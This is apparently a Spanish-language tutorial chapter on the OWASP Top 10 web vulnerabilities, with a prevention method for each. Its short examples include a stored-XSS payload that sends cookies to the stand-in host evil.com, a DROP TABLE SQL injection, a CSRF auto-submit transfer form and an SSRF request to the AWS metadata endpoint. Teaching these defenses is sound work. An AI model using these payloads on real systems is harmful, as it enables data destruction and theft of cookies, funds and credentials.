# 10.2 Vulnerabilidades Comunes (OWASP Top 10)

## Definición

OWASP Top 10 es la lista de las vulnerabilidades web más críticas. Todo desarrollador backend debe conocerlas y saber cómo prevenirlas.

## Mecánica interna

### SQL Injection

```
  Vulnerable:
  query = f"SELECT * FROM users WHERE email = '{email}'"
  Input: email = "'; DROP TABLE users; --"
  → SELECT * FROM users WHERE email = ''; DROP TABLE users; --'

  Solución: Parameterized queries (SIEMPRE)
  cursor.execute("SELECT * FROM users WHERE email = %s", [email])
  → El driver escapa automáticamente. El input es DATA, no código.
```

### XSS (Cross-Site Scripting)

```
  Stored XSS:
  User saves: <script>fetch('evil.com?cookie='+document.cookie)</script>
  Otro usuario ve la página → script se ejecuta → roba cookies.

  Solución:
  - Sanitizar output (escape HTML entities)
  - Content-Security-Policy header (bloquea inline scripts)
  - HttpOnly cookies (JavaScript no puede leer)
```

### CSRF (Cross-Site Request Forgery)

```
  Usuario logueado en bank.com (tiene session cookie).
  Visita evil.com que tiene:
  <form action="bank.com/transfer" method="POST">
    <input name="to" value="attacker"><input name="amount" value="10000">
  </form>
  <script>document.forms[0].submit()</script>

  El browser envía la cookie de bank.com automáticamente → transferencia ejecutada.

  Solución:
  - SameSite=Strict/Lax cookies (browser no envía cookie cross-site)
  - CSRF tokens (form incluye token que evil.com no puede obtener)
```

### SSRF (Server-Side Request Forgery)

```
  Endpoint: POST /fetch-url {url: "http://example.com"}
  Atacante: {url: "http://169.254.169.254/latest/meta-data/"}
  → Tu servidor hace request al metadata endpoint de AWS → obtiene credenciales.

  Solución:
  - Validar y whitelist URLs permitidas
  - Bloquear IPs privadas/internas (10.x, 172.16.x, 169.254.x)
  - No permitir redirecciones a IPs internas
```

### Broken Access Control

```
  GET /api/users/42/orders → retorna órdenes del user 42
  Atacante cambia: GET /api/users/43/orders → ve órdenes de otro usuario!

  Solución: verificar que el usuario autenticado tiene permiso
  para acceder al recurso solicitado. SIEMPRE.

  if request.user.id != params.user_id:
      return 403 Forbidden
```

### Tabla resumen

| Vulnerabilidad | Prevención principal |
|---------------|---------------------|
| SQL Injection | Parameterized queries, ORM |
| XSS | Output encoding, CSP header |
| CSRF | SameSite cookies, CSRF tokens |
| SSRF | URL validation, IP blocklist |
| Broken Access Control | Authorization check en cada endpoint |
| Insecure Deserialization | No deserializar input no confiable, validar schema |
| Injection (general) | Nunca concatenar input del usuario en queries/comandos |

## Insights de ingeniería

- **SQL injection sigue siendo #1**: a pesar de ser conocida desde hace 20+ años. Usa SIEMPRE parameterized queries o un ORM. Nunca construyas queries con string concatenation.
- **CSP header es tu mejor defensa contra XSS**: `Content-Security-Policy: default-src 'self'` bloquea scripts inline y de dominios no autorizados.
- **Security es capa por capa**: input validation + parameterized queries + output encoding + security headers + least privilege + monitoring. No hay una sola solución mágica.
